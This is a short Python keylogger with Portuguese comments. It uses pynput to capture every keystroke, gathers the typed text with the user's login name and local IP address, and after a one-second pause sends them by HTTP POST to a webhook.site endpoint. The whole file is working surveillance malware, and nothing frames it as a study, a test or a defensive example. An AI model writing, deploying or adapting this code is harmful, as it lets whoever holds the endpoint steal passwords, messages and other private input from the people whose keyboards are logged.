import requests
from pynput import keyboard
from getpass import getuser
import socket
import threading

# Função para enviar o texto para o endpoint
def send_text(username, ip_address, text):
    url = "https://webhook.site/80568ce8-8222-4717-95d4-08ba1144ec99"
    data = {
        "username": username,
        "ip_address": ip_address,
        "text": text
    }
    response = requests.post(url, json=data)
    if response.status_code == 200:
        print("Texto enviado com sucesso!")
    else:
        print("Erro ao enviar texto.")

# Função callback para quando uma tecla for pressionada
def on_press(key):
    global text, timer
    try:
        # Adiciona a tecla pressionada ao texto atual
        text += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            # Adiciona um espaço ao texto
            text += ' '

    if timer:
        # Reinicia o temporizador se ele já estiver em execução
        timer.cancel()
    else:
        # Inicia o temporizador se for a primeira tecla digitada
        timer = threading.Timer(1, print_text)
        timer.start()

# Função para imprimir o texto completo após uma pausa de X segundos
def print_text():
    global text
    username = getuser()
    ip_address = socket.gethostbyname(socket.gethostname())
    send_text(username, ip_address, text)
    text = ''

# Função callback para quando uma tecla for solta
def on_release(key):
    global timer
    if key == keyboard.Key.esc:
        # Se a tecla ESC for pressionada, interrompe a execução do listener
        return False

    if timer:
        # Reinicia o temporizador se uma tecla for solta
        timer.cancel()
        timer = threading.Timer(1, print_text)
        timer.start()

# Inicializa as variáveis
text = ''
timer = None

# Cria um listener para escutar as teclas
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()